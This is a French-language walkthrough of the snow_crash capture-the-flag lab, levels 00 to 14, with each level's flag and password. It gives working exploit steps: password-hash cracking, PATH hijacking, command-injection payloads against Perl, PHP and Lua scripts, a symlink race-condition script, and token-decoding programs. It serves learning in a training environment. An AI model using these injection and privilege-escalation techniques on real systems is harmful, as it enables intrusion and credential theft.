# snow_crash

Se connecter : 

```c
login: level00
Password: level00
```

pour passer a un autre level 
```c
su levelxx
```

pour entrer un flag
```c
su flagxx
```



level00

Definitions :

Un groupe = c'est un ensemble d'utilisateurs qui partagent les mêmes droits.
Si un fichier apparatient au groupe users,a lros tout les utuilisateurs du groupe users pourront y acceder selon les permissions.


groups 



Piste : 
J'ai taper groups 
```c
level00 users
```

level00 c'est mon utilisateur principal et il appartient au groupe users.

donc j'ai voulu chercher dans l'ordinateur les fichiers qui appartient a l'utilisateur flag00 et tout le reste je les dans la poubelle temporaire ( Poubelle qui eface tout ce qu'on l'envoie)
donc il y a deux choses qui reste 

```c
/usr/sbin/john
/rofs/usr/sbin/john
```

J'ai cat le contenu et je les decrypter surdconde.fr 
cdiiddwpgswtgt

c'est du rot15

resultat: 

```c
nottoohardhere
```

Je me suis connecter avec : 
su flag00
Password: nottoohardhere

flag: 
x24ti5gi3x0o12eh4esiuxias

-----------------

level01 

Piste: 
j'ai tape : 

```c
cat /etc/passwd 
cela liste tout les comptes utilisateur qu'il y a sur cette ordinateur
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

```

c'est le mot de pass et pour dechiffer un mot de passe, il faut utiliser
john the ripper
J'ai installer nix-shell 
```c
sh <(curl -L https://nixos.org/nix/install)
```
puis j'ai installer john the ripper 

```c
nix-shell -p john
```

j'ai envoyer le contenu dans un fichier
```c
echo "flag01:42hDRfypTqqnw" > hash.txt

```
j'ai utiliser john sur le fichier

```c
john hash.txt
```

flag: f2av5il02puano7naaf6adaaf

------------------------------------------
level02

j'ai fais ls
j'ai vue .pcap 
c'est un enregistrement de trafic et donc on utilise wireshark pour explorer
et comprendre le trafic.

scp -P 4242 level02@10.11.248.91:/home/user/level02/level02.pcap .
pour mettre le fichier sur mon ordinateur

installer Wireshark

```c
nix-shell -p wireshark
```

j'ai donner les deroit au fichier et
j'ai lancer wireshark
```c
chmod 777 level02.pcap
wireshark level02.pcap
```

clique droit sur Pas sword:
```c
tcp screen
```

```c
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login: 
```
Il a taper son mot de pass puis 3 fois il a appuyer sur del.
ft_waNDReLOL

flag: kooda2puivaav1idi4f57q8iq

-----------

level03

ls -l 
j'ai vue qu'il avait un executable

je l'ai copier sur mon ordi pour l'analyser sur dogbolt
```c
scp -P 4242 level03@10.11.248.91:/home/user/level03/level03 ~/Desktop/
```

etape: 
dans le main on a vue ceci 

```c
system("/usr/bin/env echo Exploit me")
```
Cela veut dire qu'il execute un truc dans la variable env. 


donc on vas lui injecter un faux echo 
```c
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```


flag: qi0maab88jeaj46qoumi7maus

--------------

level04

j'ai cat le fichier Perl 

j'ai vue
```c
print `echo $y 2>&1`;
```
ce que l'utilisateur envoie dans url , on le met apres un echo

```c
curl "http://localhost:4747/?x=\`getflag\`"
```

Ici, on remplace l’argument de echo par la sortie de getflag → donc c’est getflag qui est exécuté par Perl, et son résultat est imprimé.


flag: ne2searoevaevoem4ov4ar8ap

-----------

level05

```c
find / -user flag05 2> /dev/null 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

j'ai cat

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

il exécute n’importe quel script placé dans /opt/openarenaserver/.


donc je vais executer mon getflag
```c
echo "getflag > /tmp/result_flag05" > /opt/openarenaserver/monscript.sh
```

puis je cat
```c
cat /tmp/result_flag05
```

flag: viuaaale9huek52boumoomioc

-------------

level06

ls -la 

```c
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
```

j'ai cat le fichier php

on a compris que le code permet de lancer une fonction avec le /e

```c
$a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

donc 

```c
echo '[x ${`getflag`}]' >> /tmp/test.txt
```

puis j'ai lancer executable. 

flag: wiok45aaoguiboiki2tuin6ub


---------------------------------
level07


ls -la 
c'est un execulatable 

j'ai executer cette comande dans un terminal neutre 
```c
scp -P 4242 level07@10.11.248.91:/home/user/level07/level07 ~/Desktop/
```

puis je l'ai fais decrypter sur dogbolt.


```c
asprintf(&cmd, "/bin/echo %s ", getenv("LOGNAME"));
```

cela veut dire qu'il execute ce qu'il y dans getenv
donc je change la variable d'environnement
je lui dis d'executer getflag 

```c
export LOGNAME='$(getflag)'
```
apres je lance le script

flag: fiumuikeil55xe9cu4dood66h


-----
level 08

scp -P 4242 level08@10.11.248.91:/home/user/level08/level08 ~/Desktop/

dogbolt

```c
if (argc == 1) {
    printf("%s [file to read]\n", *argv);
    exit(1);
}
```

Si tu ne donnes pas de fichier en argument, il affiche la syntaxe et quitte.

```c
if (strstr(argv[1], "token")) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```
il cherche la chaîne "token" dans l’argument, et refuse l’accès si elle est trouvée.

```c
ln -s /home/user/level08/token /tmp/maflag
Créer un lien symbolique pointant vers le fichier protégé (token).
```

```c
./level08 /tmp/maflag
```

su flag08 puis getflag
flag: 25749xKZ8L7DkSCwJkT9dyv6f


-------------------------------
level09

ls -la 

```c
./level09 abcd
```

on a vue un decalage donc on a creer un programme qui stop le decalage

```c
#include <stdio.h>

int main(int argc, char **argv)
{
    int i;

    i = 0;

    if (argc != 2)
        return 1;
    while (argv[1][i])
    {
        printf("%c", argv[1][i] -i);
        i++;
    }
}
```

puis on a lancer la commande 
```c
cd /tmp
gcc decode.c  -o decode
cd 
cat token | xargs /tmp/decode
xargs prend l’entrée de la commande précédente (ici cat token) et la passe comme argument au programme que tu indiques (/tmp/decode).
```


flag: s5cAJpM8ev6XHw998pRWG728z

---------------------

level10 

recupere l'executable 
dans un terminal neutre
```c
scp -P 4242 level10@10.11.248.91:/home/user/level10/level10 /tmp/level10
```

envoyer le fichier a dogbolt

on a analyser le fichier :

Le programme vérifie d’abord les droits d’accès au fichier avec access(), puis ouvre le fichier plus tard avec open().

Cela crée une fenêtre de vulnérabilité : on peut remplacer le fichier entre les deux appels (race condition) et forcer le binaire à lire le token.

```c
while true; do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
```
Ici on atten que le programme level10 envoie le contenu du fichier token.

vim /tmp/getflag.sh


```c
#!/bin/bash

random_file=$(mktemp /tmp/fileXXXX)   # fichier temporaire vide
link_name=$(mktemp -u /tmp/linkXXXX) # nom de lien temporaire

# Boucle qui exécute level10 en continu
while true; do
    /home/user/level10/level10 $link_name 127.0.0.1 &>/dev/null
done &

# Boucle qui change rapidement le lien symbolique
while true; do
    ln -fs /home/user/level10/token $link_name
    ln -fs $random_file $link_name
done
```


on le rends executable
```c
chmod +x /tmp/getflag.sh
```

dans le terminal2

```c
/tmp/getflag.sh
```

dans le terminal on recupe le mot de passe.

flag: feulo4b72j7edeahuete3no7c

-----------------

level11 

ls -la

j'ai cat level11.lua

```c
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Problème : comme la variable pass est injectée directement dans la commande, on peut faire une injection de commande avec ;.

echo '; getflag > /tmp/flag11' | nc localhost 5151
cat /tmp/flag11

flag: fa6v5ateaw21peobuub8ipe6s


---------------------
level12 

cat level12.pl

```pl
#!/usr/bin/env perl            # Lance le script avec Perl
# localhost:4646               # Indication : tourne sur le port 4646 en local
use CGI qw{param};             # Charge le module CGI pour lire les paramètres (GET/POST)
print "Content-type: text/html\n\n";   # En-tête HTTP pour indiquer qu'on renvoie du HTML

sub t {
  $nn = $_[1];                 # Récupère le 2ème argument (param y)
  $xx = $_[0];                 # Récupère le 1er argument (param x)
  $xx =~ tr/a-z/A-Z/;          # Transforme toutes les lettres minuscules en majuscules
  $xx =~ s/\s.*//;             # Coupe tout ce qu’il y a après le premier espace
  @output = `egrep "^$xx" /tmp/xd 2>&1`;  # Exécute egrep dans le shell → injection possible
  foreach $line (@output) {    # Boucle sur chaque ligne trouvée
      ($f, $s) = split(/:/, $line);   # Coupe chaque ligne au niveau de ":" (sépare en deux parties)
      if($s =~ $nn) {          # Si la deuxième partie ($s) contient le texte $nn
          return 1;            # Retourne vrai (1)
      }
  }
  return 0;                    # Sinon retourne faux (0)
}

sub n {
  if($_[0] == 1) {             # Si l’argument est égal à 1
      print("..");             # Affiche deux points
  } else {
      print(".");              # Sinon affiche un seul point
  }    
}

n(t(param("x"), param("y")));  # Appelle t(x, y), puis passe le résultat à n()
```






Le script level12.pl prend deux paramètres (x et y) depuis une requête CGI.

Il exécute egrep "^$xx" /tmp/xd, où xx = paramètre x.

Comme xx est injecté tel quel dans une commande shell avec les backticks `...`, on peut faire une injection de commande.

Idée : au lieu de donner une vraie regex à egrep, on injecte une commande (getflag) pour écrire le flag dans /tmp/flag12.

On doit passer la commande 

```bash
$(getflag)
```

mais le programme la met en majuscule ce qui fait qu'elle ne sera pas executer 


```bash
cd /tmp
vim FLAG        # script qui fait : getflag > /tmp/flag12
chmod +x FLAG
```

```c
curl 'localhost:4646/?x=$(/*/FLAG)'
```
Ici $(/*/FLAG) exécute le script placé dans /tmp/.

```bash
#!/bin/sh

getflag > /tmp/flag12
```


```bash
cat /tmp/flag12
```


flag: g1qKMiRpXf53AWhDaU7FEkczr

--------------------

level13

```c
if (getuid() == 0x1092)
    return printf("your token is %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));
else
    printf("UID %d started us but we expect %d\n", getuid(), 0x1092);
```

Cela signifie que le programme n’imprime le token que si l’UID est 0x1092 (soit 4242 en décimal = utilisateur flag13).

j'ai ecris un fonction de decodage 

```c
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char * ft_des(char *param_1)
{
	char *param_copy;
	uint param_len;
	char *param_copy_2;
	uint param_index;
	int num_index;
	int i;
	int j;
	char num_str[] = "0123456";
	char p_char;

	param_copy = strdup(param_1);
	num_index = 0;
	param_index = 0;

	param_copy_2 = param_copy;
	param_len = 0xffffffff;
	/* calculate the length of parameter : strlen(param_1) */
	do	{
		if (param_len == 0)
			break;
		param_len = param_len - 1;
		p_char = *param_copy_2;
		param_copy_2 = param_copy_2 + 1;
	} while(p_char);
	do {
		/* If param_index == len */
		if (~param_len - 1 <= param_index)
			return (param_copy);

		if (num_index == 6)
			num_index = 0;

		/* if param_index is a XX number then it's true */
		if ((param_index & 1) == 0)
		{
			if ((param_index & 1) == 0) 
			{
				i = 0;
				while (i < num_str[num_index])
				{
					param_copy[param_index] = param_copy[param_index] + -1;
					if (param_copy[param_index] == 0x1f)
						param_copy[param_index] = '~';
					i = i + 1;
				}
			}
		}
		else
		{
			j = 0;
			while (j < num_str[num_index])
			{
				param_copy[param_index] = param_copy[param_index] + 1;
				if (param_copy[param_index] == 0x7f) // 0x7f is the ascii code for Delete
					param_copy[param_index] = ' ';
				j = j + 1;
			}
		}
		param_index = param_index + 1;
		num_index = num_index + 1;
	} while( true );
}

int main(int argc, char const *argv[])
{
	printf("Flag : %s\n", ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I"));
	return 0;
}
```


```bash
gcc decode.c -o decrypt  
./decrypt
```

flag: 2A31L79asukciNyi8uppkEuSx

---------------------
level14

terminal neutre

```c
#include <stdio.h>    // pour printf
#include <stdlib.h>   // pour malloc, free, etc.
#include <string.h>   // pour strdup, strlen
#include <stdint.h>   // types entiers fixes (ex: uint32_t)

// Fonction qui déchiffre une chaîne codée
char *ft_des(char *param_1)
{
    char cVar1;        // caractère temporaire pour les comparaisons
    char *pcVar2;      // copie de la chaîne à modifier
    unsigned int uVar3; // compteur utilisé pour mesurer la longueur
    char *pcVar4;      // pointeur temporaire sur la chaîne
    unsigned int local_20; // index de caractère courant
    int local_1c;      // index dans la séquence "0123456"
    int local_18;      // compteur pour boucle (cas +)
    int local_14;      // compteur pour boucle (cas -)
    
    pcVar2 = strdup(param_1); // duplique la chaîne pour pouvoir la modifier
    local_1c = 0;             // commence à 0 dans la séquence "0123456"
    local_20 = 0;             // index au début de la chaîne

    // boucle infinie
    do {
        uVar3 = 0xffffffff;   // initialise un compteur très grand
        pcVar4 = pcVar2;      // pointeur au début de la chaîne

        // calcule la longueur de la chaîne (similaire à strlen)
        do {
            if (uVar3 == 0) break;  // sécurité anti-overflow
            uVar3 = uVar3 - 1;      // décrémente le compteur
            cVar1 = *pcVar4;        // prend le caractère courant
            pcVar4 = pcVar4 + 1;    // avance le pointeur
        } while (cVar1 != '\0');    // stop quand on atteint le '\0'

        // si on a atteint la fin de la chaîne → retour
        if (~uVar3 - 1 <= local_20) {
            return pcVar2;    // retourne la chaîne déchiffrée
        }

        // boucle sur "0123456" → recommence à 0 après 6
        if (local_1c == 6) local_1c = 0;

        // si la position est paire → on décrémente
        if ((local_20 & 1) == 0) {
            for (local_14 = 0; local_14 < "0123456"[local_1c]; local_14++) {
                pcVar2[local_20]--;   // décrémente le caractère
                if (pcVar2[local_20] == '\x1f') // si < espace
                    pcVar2[local_20] = '~';     // boucle sur '~'
            }
        } 
        // si la position est impaire → on incrémente
        else {
            for (local_18 = 0; local_18 < "0123456"[local_1c]; local_18++) {
                pcVar2[local_20]++;   // incrémente le caractère
                if (pcVar2[local_20] == '\x7f') // si dépasse '~'
                    pcVar2[local_20] = ' ';     // boucle sur espace
            }
        }

        local_20++; // avance à la lettre suivante
        local_1c++; // avance dans la séquence "0123456"
    } while(1);     // recommence jusqu’à la fin de la chaîne
}

int main()
{
    // appel de ft_des avec la chaîne codée (celle de UID 0xbc6)
    char *flag = ft_des("g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|");

    // affiche la chaîne déchiffrée
    printf("Flag: %s\n", flag);

    // libère la mémoire allouée par strdup
    free(flag);

    return 0; // fin normale
}
```

```c
gcc -std=c99 -Wall -Wextra -o test test.c
./test
```

flag: 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
















